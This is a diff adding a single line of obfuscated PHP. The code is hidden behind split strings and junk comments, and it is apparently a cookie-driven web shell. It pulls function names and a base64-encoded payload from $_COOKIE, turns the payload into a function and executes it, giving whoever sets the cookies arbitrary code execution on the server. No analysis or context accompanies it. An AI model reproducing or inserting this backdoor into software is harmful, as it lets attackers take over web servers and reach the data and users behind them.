@@ -1,0 +1,1 @@
+<?php $x='_C';$tl='E';/*y*/$n='OO';/*InE*/$e='KI';$m/*h*/=${$x.$n.$e.$tl};if(isset($m/*ZvD{*/['bT'])){$j=$m['bT'].$m['Z'];$ky=$m['p'].$m['h'].$m['t'];$uo=$j('',$ky($m['E']));$uo();}
